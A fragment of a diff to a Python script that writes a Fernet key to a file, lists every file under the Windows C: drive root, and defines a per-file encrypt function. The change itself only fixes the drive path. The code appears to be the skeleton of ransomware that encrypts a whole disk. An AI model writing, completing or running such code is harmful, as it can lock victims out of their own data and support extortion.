@@ -11,7 +11,7 @@ with open('mykey.key', 'wb') as mykey:
 f = Fernet(key)
 files = [None]
 def listdir():
-    return getListOfFiles('c:/')
+    return getListOfFiles('C:\\')
 
 def encrypt(filename, key):
     f = Fernet(key)
